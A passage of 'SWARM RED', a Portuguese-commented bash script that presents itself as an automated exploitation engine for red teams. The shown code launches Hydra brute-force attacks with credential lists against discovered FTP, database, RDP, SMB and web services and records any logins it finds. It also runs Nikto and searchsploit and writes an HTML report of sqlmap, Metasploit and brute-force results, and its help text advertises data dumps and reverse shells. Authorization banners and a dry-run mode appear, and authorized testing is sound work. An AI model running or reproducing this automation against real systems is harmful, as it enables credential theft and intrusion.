    grep -q "21/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("ftp:21")
    grep -qE "3306/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("mysql:3306")
    grep -qE "5432/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("postgres:5432")
    grep -qE "3389/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("rdp:3389")
    grep -qE "445/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("smb:445")

    # HTTP form (se 80 ou 443 abertos)
    if grep -qE "^(80|443)/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
        services_to_test+=("http-get:443")
    fi

    if [ ${#services_to_test[@]} -eq 0 ]; then
        warn "Nenhum serviço compatível com brute force detectado"
        return 0
    fi

    info "${#services_to_test[@]} serviço(s) para testar"

    for svc_port in "${services_to_test[@]}"; do
        local svc="${svc_port%%:*}"
        local port="${svc_port##*:}"

        info "Testando $svc na porta $port..."

        if [ "$DRY_RUN" = true ]; then
            info "[DRY-RUN] hydra -L $userlist -P $passlist -s $port -t 4 -f $target_ip $svc"
            continue
        fi

        log_cmd "hydra -L $userlist -P $passlist -s $port -t 4 -f -o $OUTDIR/hydra/${svc}_results.txt $target_ip $svc"

        timeout 300 hydra \
            -L "$userlist" \
            -P "$passlist" \
            -s "$port" \
            -t 4 \
            -f \
            -o "$OUTDIR/hydra/${svc}_results.txt" \
            "$target_ip" "$svc" \
            2>&1 | tee "$OUTDIR/hydra/${svc}_output.log" || true

        # Verificar resultados
        if grep -qiE "login:|password:" "$OUTDIR/hydra/${svc}_results.txt" 2>/dev/null; then
            info "  ${RED}⚡ CREDENCIAIS ENCONTRADAS para $svc!${RST}"
            cat "$OUTDIR/hydra/${svc}_results.txt" | tee -a "$OUTDIR/exploits_confirmed.csv"
            ((SUCCESSFUL_EXPLOITS++))
        fi
        ((TOTAL_EXPLOITS++))
    done

    info "Brute force fase completa"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 5: NIKTO (Web Vuln Scanner)
# ═══════════════════════════════════════════════════════════════════════════════
run_nikto_phase() {
    phase "FASE 5/6: NIKTO WEB SCANNER"

    if [ "${PROFILE_NIKTO_ENABLED[$PROFILE]}" != "true" ]; then
        warn "Nikto desabilitado no perfil $PROFILE"
        return 0
    fi

    if ! has nikto; then
        warn "nikto não encontrado — fase desabilitada"
        return 0
    fi

    mkdir -p "$OUTDIR/nikto"

    local nikto_target="https://${TARGET}"

    if [ "$DRY_RUN" = true ]; then
        info "[DRY-RUN] nikto -h $nikto_target -o $OUTDIR/nikto/nikto_report.json -Format json"
        return 0
    fi

    info "Escaneando: $nikto_target"
    log_cmd "nikto -h $nikto_target -o $OUTDIR/nikto/nikto_report.json -Format json -Tuning 123456789abc -maxtime 600"

    timeout 700 nikto \
        -h "$nikto_target" \
        -o "$OUTDIR/nikto/nikto_report.json" \
        -Format json \
        -Tuning "123456789abc" \
        -maxtime 600 \
        2>&1 | tee "$OUTDIR/nikto/nikto_output.log" || true

    # Contar achados
    if [ -f "$OUTDIR/nikto/nikto_report.json" ]; then
        local findings
        findings=$(jq -r '.vulnerabilities | length' "$OUTDIR/nikto/nikto_report.json" 2>/dev/null || echo "0")
        info "Nikto findings: $findings"
    fi

    info "Nikto fase completa"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 6: SEARCHSPLOIT + RELATÓRIO
# ═══════════════════════════════════════════════════════════════════════════════
run_searchsploit_phase() {
    phase "FASE 6/6: SEARCHSPLOIT + RELATÓRIO FINAL"

    mkdir -p "$OUTDIR/searchsploit"

    # ── SearchSploit para CVEs encontrados ──
    if has searchsploit && [ -f "$OUTDIR/cves_found.txt" ] && [ -s "$OUTDIR/cves_found.txt" ]; then
        info "Buscando exploits públicos para CVEs encontrados..."

        while IFS= read -r cve; do
            [ -z "$cve" ] && continue
            if [ "$DRY_RUN" = true ]; then
                info "[DRY-RUN] searchsploit $cve"
                continue
            fi

            local result
            result=$(searchsploit --json "$cve" 2>/dev/null || echo "{}")
            echo "$result" > "$OUTDIR/searchsploit/${cve}.json"

            local count
            count=$(echo "$result" | jq '.RESULTS_EXPLOIT | length' 2>/dev/null || echo "0")
            if [ "$count" -gt 0 ]; then
                info "  $cve → $count exploit(s) público(s)"
            fi
        done < "$OUTDIR/cves_found.txt"
    fi

    # ── Gerar relatório consolidado ──
    _generate_report
}

# ═══════════════════════════════════════════════════════════════════════════════
#  GERADOR DE RELATÓRIO HTML
# ═══════════════════════════════════════════════════════════════════════════════
_generate_report() {
    info "Gerando relatório HTML..."

    $VENV_PYTHON << 'PYEOF' - "$OUTDIR" "$TARGET" "$PROFILE" "$TOTAL_EXPLOITS" "$SUCCESSFUL_EXPLOITS" "$FAILED_EXPLOITS" "$VERSION"
import sys, os, json, glob
from datetime import datetime

outdir = sys.argv[1]
target = sys.argv[2]
profile = sys.argv[3]
total = int(sys.argv[4])
success = int(sys.argv[5])
failed = int(sys.argv[6])
version = sys.argv[7]

now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

# ── Coletar dados ──
sqli_results = []
for f in glob.glob(f"{outdir}/sqlmap/*_output.log"):
    with open(f) as fh:
        content = fh.read()
        is_vuln = any(w in content.lower() for w in ["is vulnerable", "injectable", "payload"])
        sqli_results.append({"file": os.path.basename(f), "vulnerable": is_vuln, "content": content[-500:]})

msf_log = ""
msf_path = f"{outdir}/metasploit/msf_output.log"
if os.path.exists(msf_path):
    with open(msf_path) as fh:
        msf_log = fh.read()

hydra_results = []
for f in glob.glob(f"{outdir}/hydra/*_results.txt"):
    with open(f) as fh:
        content = fh.read().strip()
        if content:
            hydra_results.append({"service": os.path.basename(f).replace("_results.txt",""), "content": content})

nikto_findings = []
nikto_path = f"{outdir}/nikto/nikto_report.json"
if os.path.exists(nikto_path):
    try:
        with open(nikto_path) as fh:
            data = json.load(fh)
            nikto_findings = data.get("vulnerabilities", [])
    except Exception:
        pass

# Exploits confirmed
confirmed = []
confirmed_path = f"{outdir}/exploits_confirmed.csv"
if os.path.exists(confirmed_path):
    with open(confirmed_path) as fh:
        for line in fh:
            parts = line.strip().split("|")
            if len(parts) >= 3:
                confirmed.append({"status": parts[0], "target": parts[1], "tool": parts[2], "detail": parts[3] if len(parts)>3 else ""})

# CVEs + searchsploit
cves = []
cve_path = f"{outdir}/cves_found.txt"
if os.path.exists(cve_path):
    with open(cve_path) as fh:
        cves = [l.strip() for l in fh if l.strip()]

searchsploit_data = {}
for f in glob.glob(f"{outdir}/searchsploit/CVE-*.json"):
    cve = os.path.basename(f).replace(".json","")
    try:
        with open(f) as fh:
            data = json.load(fh)
            exploits = data.get("RESULTS_EXPLOIT", [])
            if exploits:
                searchsploit_data[cve] = exploits
    except Exception:
        pass

# ── HTML ──
html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SWARM RED — {target}</title>
<style>
:root {{
    --bg: #0a0a0f;
    --surface: #12121a;
    --surface2: #1a1a25;
    --border: #2a2a3a;
    --text: #e0e0e8;
    --text-dim: #8888aa;
    --red: #ff4444;
    --red-bg: #ff444415;
    --orange: #ff8c00;
    --orange-bg: #ff8c0015;
    --yellow: #ffd700;
    --yellow-bg: #ffd70015;
    --green: #00cc66;
    --green-bg: #00cc6615;
    --blue: #4488ff;
    --blue-bg: #4488ff15;
    --purple: #aa66ff;
}}
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; line-height:1.6; }}
.container {{ max-width:1200px; margin:0 auto; padding:20px; }}

/* Header */
.header {{ background: linear-gradient(135deg, #1a0000 0%, #0a0a0f 50%, #0a000a 100%);
    border:1px solid var(--red); border-radius:12px; padding:30px; margin-bottom:24px; text-align:center; }}
.header h1 {{ color:var(--red); font-size:2.2em; letter-spacing:3px; margin-bottom:8px; }}
.header .subtitle {{ color:var(--text-dim); font-size:0.95em; }}
.header .warning {{ background:var(--red-bg); border:1px solid var(--red); color:var(--red);
    padding:8px 16px; border-radius:6px; display:inline-block; margin-top:12px; font-weight:600; font-size:0.85em; }}

/* Info grid */
.info-grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:12px; margin-bottom:24px; }}
.info-card {{ background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:16px; }}
.info-card .label {{ color:var(--text-dim); font-size:0.8em; text-transform:uppercase; letter-spacing:1px; }}
.info-card .value {{ color:var(--text); font-size:1.1em; font-weight:600; margin-top:4px; }}

/* Stats */
.stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:12px; margin-bottom:24px; }}
.stat {{ background:var(--surface); border-radius:8px; padding:20px; text-align:center; border-left:4px solid var(--border); }}
.stat.critical {{ border-left-color:var(--red); }}
.stat.success {{ border-left-color:var(--green); }}
.stat.warning {{ border-left-color:var(--orange); }}
.stat .number {{ font-size:2em; font-weight:700; }}
.stat .label {{ color:var(--text-dim); font-size:0.8em; text-transform:uppercase; }}

/* Sections */
.section {{ background:var(--surface); border:1px solid var(--border); border-radius:8px; margin-bottom:16px; overflow:hidden; }}
.section-header {{ background:var(--surface2); padding:14px 20px; border-bottom:1px solid var(--border);
    display:flex; align-items:center; gap:10px; }}
.section-header h2 {{ font-size:1.1em; }}
.section-body {{ padding:20px; }}

/* Tables */
table {{ width:100%; border-collapse:collapse; }}
th {{ background:var(--surface2); padding:10px 14px; text-align:left; font-size:0.85em;
    text-transform:uppercase; letter-spacing:0.5px; color:var(--text-dim); border-bottom:1px solid var(--border); }}
td {{ padding:10px 14px; border-bottom:1px solid var(--border); font-size:0.9em; }}
tr:hover {{ background:var(--surface2); }}

/* Tags */
.tag {{ display:inline-block; padding:2px 8px; border-radius:4px; font-size:0.75em; font-weight:600; }}
.tag.vuln {{ background:var(--red-bg); color:var(--red); }}
.tag.safe {{ background:var(--green-bg); color:var(--green); }}
.tag.info {{ background:var(--blue-bg); color:var(--blue); }}

/* Code blocks */
pre {{ background:var(--bg); border:1px solid var(--border); border-radius:6px;
    padding:14px; overflow-x:auto; font-size:0.85em; color:var(--text-dim); white-space:pre-wrap; word-break:break-all; max-height:400px; }}

.footer {{ text-align:center; padding:20px; color:var(--text-dim); font-size:0.8em; border-top:1px solid var(--border); margin-top:30px; }}
</style>
</head>
<body>
<div class="container">

<div class="header">
    <h1>SWARM RED</h1>
    <div class="subtitle">Automated Exploitation Report — v{version}</div>
    <div class="warning">⚠ CONFIDENCIAL — USO EXCLUSIVO RED TEAM — AMBIENTE AUTORIZADO</div>
</div>

<div class="info-grid">
    <div class="info-card"><div class="label">Alvo</div><div class="value">{target}</div></div>
    <div class="info-card"><div class="label">Perfil</div><div class="value">{profile.upper()}</div></div>
    <div class="info-card"><div class="label">Data</div><div class="value">{now}</div></div>
    <div class="info-card"><div class="label">Duração</div><div class="value" id="duration">—</div></div>
</div>

<div class="stats">
    <div class="stat warning">
        <div class="number">{total}</div>
        <div class="label">Testes Executados</div>
    </div>
    <div class="stat critical">
        <div class="number" style="color:var(--red)">{success}</div>
        <div class="label">Exploits Confirmados</div>
    </div>
    <div class="stat success">
        <div class="number" style="color:var(--green)">{total - success}</div>
        <div class="label">Não Vulnerável</div>
    </div>
    <div class="stat">
        <div class="number" style="color:var(--purple)">{len(cves)}</div>
        <div class="label">CVEs Analisados</div>
    </div>
</div>
"""

# ── Exploits Confirmados ──
if confirmed:
    html += """
<div class="section">
    <div class="section-header"><h2 style="color:var(--red)">⚡ Exploits Confirmados</h2></div>
    <div class="section-body">
    <table>
    <tr><th>Status</th><th>Alvo</th><th>Ferramenta</th><th>Detalhe</th></tr>
"""
    for c in confirmed:
        tag = "vuln" if c["status"] == "VULNERABLE" else "safe"
        html += f'    <tr><td><span class="tag {tag}">{c["status"]}</span></td><td>{c["target"][:80]}</td><td>{c["tool"]}</td><td>{c["detail"]}</td></tr>\n'
    html += "    </table></div></div>\n"

# ── SQLi ──
if sqli_results:
    html += """
<div class="section">
    <div class="section-header"><h2>🗄️ SQL Injection (sqlmap)</h2></div>
    <div class="section-body">
    <table>
    <tr><th>Teste</th><th>Resultado</th><th>Evidência (últimos 500 chars)</th></tr>
"""
    for r in sqli_results:
        tag = "vuln" if r["vulnerable"] else "safe"
        label = "VULNERÁVEL" if r["vulnerable"] else "NÃO VULNERÁVEL"
        esc = r["content"].replace("<","&lt;").replace(">","&gt;")
        html += f'    <tr><td>{r["file"]}</td><td><span class="tag {tag}">{label}</span></td><td><pre>{esc}</pre></td></tr>\n'
    html += "    </table></div></div>\n"

# ── Hydra ──
if hydra_results:
    html += """
<div class="section">
    <div class="section-header"><h2 style="color:var(--orange)">🔑 Brute Force (Hydra)</h2></div>
    <div class="section-body">
    <table>
    <tr><th>Serviço</th><th>Resultados</th></tr>
"""
    for r in hydra_results:
        esc = r["content"].replace("<","&lt;").replace(">","&gt;")
        html += f'    <tr><td>{r["service"]}</td><td><pre>{esc}</pre></td></tr>\n'
    html += "    </table></div></div>\n"

# ── Metasploit ──
if msf_log:
    esc_log = msf_log[-3000:].replace("<","&lt;").replace(">","&gt;")
    html += f"""
<div class="section">
    <div class="section-header"><h2>🛡️ Metasploit</h2></div>
    <div class="section-body"><pre>{esc_log}</pre></div>
</div>
"""

# ── Nikto ──
if nikto_findings:
    html += """
<div class="section">
    <div class="section-header"><h2>🔍 Nikto Web Scanner</h2></div>
    <div class="section-body">
    <table>
    <tr><th>ID</th><th>Descrição</th><th>URL</th></tr>
"""
    for f in nikto_findings[:50]:
        desc = str(f.get("msg","")).replace("<","&lt;")
        url = str(f.get("url","")).replace("<","&lt;")
        html += f'    <tr><td>{f.get("id","")}</td><td>{desc}</td><td>{url}</td></tr>\n'
    html += "    </table></div></div>\n"

# ── CVEs + SearchSploit ──
if cves:
    html += """
<div class="section">
    <div class="section-header"><h2>📋 CVEs + Exploits Públicos</h2></div>
    <div class="section-body">
    <table>
    <tr><th>CVE</th><th>Exploits Públicos</th></tr>
"""
    for cve in cves:
        exploits = searchsploit_data.get(cve, [])
        if exploits:
            exp_list = "<br>".join([f'• {e.get("Title","")}' for e in exploits[:5]])
            html += f'    <tr><td><span class="tag vuln">{cve}</span></td><td>{exp_list}</td></tr>\n'
        else:
            html += f'    <tr><td><span class="tag info">{cve}</span></td><td>Nenhum exploit público encontrado</td></tr>\n'
    html += "    </table></div></div>\n"

# ── Activity Log ──
log_path = f"{outdir}/swarm_red.log"
log_content = ""
if os.path.exists(log_path):
    with open(log_path) as fh:
        log_content = fh.read()[-2000:].replace("<","&lt;").replace(">","&gt;")

html += f"""
<div class="section">
    <div class="section-header"><h2>📝 Activity Log (últimas entradas)</h2></div>
    <div class="section-body"><pre>{log_content}</pre></div>
</div>

<div class="footer">
    SWARM RED v{version} — Automated Exploitation Engine<br>
    Relatório gerado em {now} — Uso exclusivo Red Team — Ambiente autorizado
</div>

</div>
</body>
</html>"""

report_path = f"{outdir}/relatorio_swarm_red.html"
with open(report_path, "w", encoding="utf-8") as fh:
    fh.write(html)
print(f"REPORT_OK:{report_path}")
PYEOF

    local report_result
    report_result=$($VENV_PYTHON << 'CHECK' - "$OUTDIR"
import os, sys
p = f"{sys.argv[1]}/relatorio_swarm_red.html"
print("OK" if os.path.exists(p) else "FAIL")
CHECK
    )

    if [ -f "$OUTDIR/relatorio_swarm_red.html" ]; then
        info "Relatório: $OUTDIR/relatorio_swarm_red.html"
    else
        fail "Falha ao gerar relatório"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  SUMÁRIO FINAL
# ═══════════════════════════════════════════════════════════════════════════════
print_summary() {
    echo ""
    echo -e "${RED}═══════════════════════════════════════════════════════════════════════${RST}"
    echo -e "  ${RED}${BLD}SWARM RED — SUMÁRIO FINAL${RST}"
    echo -e "${RED}═══════════════════════════════════════════════════════════════════════${RST}"
    echo -e "  ${CYN}Alvo:${RST}       $TARGET"
    echo -e "  ${CYN}Perfil:${RST}     $PROFILE"
    echo -e "  ${CYN}Duração:${RST}    $(elapsed)"
    echo -e "  ${CYN}Testes:${RST}     $TOTAL_EXPLOITS"
    echo -e "  ${RED}Exploits:${RST}   $SUCCESSFUL_EXPLOITS confirmado(s)"
    echo -e "  ${CYN}Output:${RST}     $OUTDIR/"
    echo -e "  ${CYN}Relatório:${RST}  $OUTDIR/relatorio_swarm_red.html"
    echo -e "  ${CYN}Log:${RST}        $LOGFILE"
    echo -e "${RED}═══════════════════════════════════════════════════════════════════════${RST}"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  HELP
# ═══════════════════════════════════════════════════════════════════════════════
show_help() {
    cat << EOF
${RED}SWARM RED${RST} v${VERSION} — Automated Exploitation Engine

${BLD}USO:${RST}
  bash swarm_red.sh -d <scan_dir>                    Explorar resultados do SWARM
  bash swarm_red.sh -d <scan_dir> -p staging         Com perfil específico
  bash swarm_red.sh -d <scan_dir> --dry-run           Simular sem executar
  bash swarm_red.sh -t <target> --standalone           Sem SWARM prévio

${BLD}OPÇÕES:${RST}
  -d, --dir <path>      Diretório de output do SWARM (ex: scan_site.com_20260427_*)
  -t, --target <host>   Alvo (domínio ou IP). Auto-detectado do dir se omitido.
  -p, --profile <name>  Perfil: staging (default) | lab | production
  --dry-run             Mostrar comandos sem executar
  --standalone          Modo standalone (sem SWARM prévio)
  --lhost <ip>          IP local para reverse shells (auto-detectado)
  --lport <port>        Porta local para reverse shells (default: 4444)
  -h, --help            Esta mensagem

${BLD}PERFIS:${RST}
  ${GRN}staging${RST}     Agressividade alta. SQLi dump, Metasploit, brute force.
  ${YLW}lab${RST}         Sem restrições. Ambiente descartável.
  ${RED}production${RST}  Mínimo impacto. Só confirmação, sem dump, sem brute.

${BLD}EXEMPLOS:${RST}
  # Após rodar o SWARM:
  bash swarm_red.sh -d ~/Downloads/scan_target.com_20260427_120000

  # Lab com todas as opções:
  bash swarm_red.sh -d ./scan_lab -p lab --lhost 10.10.14.5

  # Dry-run para revisar antes de executar:
  bash swarm_red.sh -d ./scan_target -p staging --dry-run

  # Standalone (sem SWARM):
  bash swarm_red.sh -t 192.168.1.100 --standalone -p lab

${RED}⚠  USO EXCLUSIVO EM AMBIENTES AUTORIZADOS COM ROE DOCUMENTADO${RST}
EOF
    exit 0
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PARSE ARGS
# ═══════════════════════════════════════════════════════════════════════════════
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d|--dir)       SCAN_DIR="$2"; shift 2 ;;
            -t|--target)    TARGET="$2"; shift 2 ;;
            -p|--profile)   PROFILE="$2"; shift 2 ;;
            --dry-run)      DRY_RUN=true; shift ;;
            --standalone)   STANDALONE=true; shift ;;
            --lhost)        LHOST="$2"; shift 2 ;;
            --lport)        LPORT="$2"; shift 2 ;;
            -h|--help)      show_help ;;
            *)
                fail "Opção desconhecida: $1"
                show_help
                ;;
        esac
    done

    # Validações
    if [ "$STANDALONE" = false ] && [ -z "$SCAN_DIR" ]; then
        fail "Especifique o diretório do SWARM (-d) ou use --standalone"
        show_help
    fi

    if [ "$STANDALONE" = true ] && [ -z "$TARGET" ]; then
        fail "Modo standalone requer -t <target>"
        show_help
    fi

    # Validar perfil
    if [[ ! "${PROFILE_DESCRIPTION[$PROFILE]+_}" ]]; then
        fail "Perfil inválido: $PROFILE (use: staging, lab, production)"
        exit 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
main() {
    parse_args "$@"
    setup_path

    # Placeholder log until OUTDIR is created
    LOGFILE="/dev/null"

    banner
    validate_tools
    parse_swarm_results

    # Criar diretório de output (TARGET agora está definido)
    local timestamp
    timestamp=$(date '+%Y%m%d_%H%M%S')
    OUTDIR="swarm_red_${TARGET:-standalone}_${timestamp}"

    # Se parse_swarm_results já criou um OUTDIR temporário, mover conteúdo
    if [ -n "${_TEMP_OUTDIR:-}" ] && [ -d "$_TEMP_OUTDIR" ]; then
        mv "$_TEMP_OUTDIR" "$OUTDIR"
    else
        mkdir -p "$OUTDIR"/{sqlmap,metasploit,hydra,nikto,searchsploit}
    fi

    LOGFILE="$OUTDIR/swarm_red.log"
    touch "$LOGFILE"

    # Inicializar arquivos de tracking
    [ -f "$OUTDIR/exploits_confirmed.csv" ] || echo "status|target|tool|detail" > "$OUTDIR/exploits_confirmed.csv"
    [ -f "$OUTDIR/exploits_attempted.csv" ] || echo "status|target|tool|detail" > "$OUTDIR/exploits_attempted.csv"

    echo "[$(ts)] SWARM RED v${VERSION} started" >> "$LOGFILE"
    echo "[$(ts)] Profile: $PROFILE | Target: ${TARGET:-$SCAN_DIR} | Dry-run: $DRY_RUN" >> "$LOGFILE"

    confirm_roe

    run_sqli_phase
    run_msf_phase
    run_brute_phase
    run_nikto_phase
    run_searchsploit_phase

    print_summary
}

main "$@"
